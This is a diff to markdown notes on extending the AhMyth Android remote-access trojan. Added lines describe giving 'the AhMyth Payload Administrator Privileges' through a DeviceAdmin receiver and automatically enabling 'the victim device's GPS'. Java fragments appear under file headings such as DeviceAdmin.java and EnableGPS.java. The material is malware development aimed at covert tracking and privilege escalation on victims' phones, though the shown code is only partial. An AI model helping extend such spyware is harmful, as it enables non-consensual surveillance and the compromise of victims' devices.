@@ -214,6 +214,8 @@ public class ConnectionManager {
 ```
 ## Possible Device Admin Privileges
 - DeviceAdmin.java
+
+This will hopefully give the AhMyth Payload Administrator Privileges
 ```java
 package ahmyth.mine.king.ahmyth;
 
@@ -241,8 +243,10 @@ public class DeviceAdmin extends DeviceAdminReceiver {
 
 }
 ```
-## Possible Automatic enabling of Device GPS (Device admin privileges required)
-- AdminLocationMamager.java
+## Possible Auto enabling of Device GPS
+
+This will hopefully allow automatic enabling of the victim device's GPS, Device Administration Privileges are required for this to work, hence the need for the **DeviceAdmin.java** code above.
+- LocationMamager.java
 ```java
     private void activateGps(Context context) {
 
@@ -284,7 +288,7 @@ public class DeviceAdmin extends DeviceAdminReceiver {
 
     }
 ```
-- unknown.java
+- EnableGPS.java
 ```java
         perms.put("allow_location", new String[]{
 
